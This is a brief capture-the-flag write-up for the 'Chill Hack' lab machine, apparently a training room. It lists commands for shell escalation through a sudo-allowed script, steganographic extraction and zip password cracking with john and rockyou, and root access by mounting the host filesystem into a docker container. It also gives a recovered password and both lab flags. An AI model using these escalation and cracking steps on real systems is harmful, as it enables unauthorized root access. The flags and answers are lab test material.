# Chill Hack-Remote Code Execution with blacklist protection&docker privilege escalation

```
export IP=10.10.141.156
```

# Material needed

1. Interesting directory: /secret

2. Privilege escalation to user apaar

```
sudo -u apaar /home/apaar/.helpline.sh

/bin/bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

3. user anurodh password

```
steghide --extract -sf hacker-with-laptop_23-2147985341.jpg

# Crack zip password
zip2john backup.zip > backup.hash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash

cat source_code.php
Result: !d0ntKn0wmYp@ssw0rd
```

4. Privilege escalation

```
docker images
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

# Tasks

1. User flag

```
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

2. Root flag

```
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```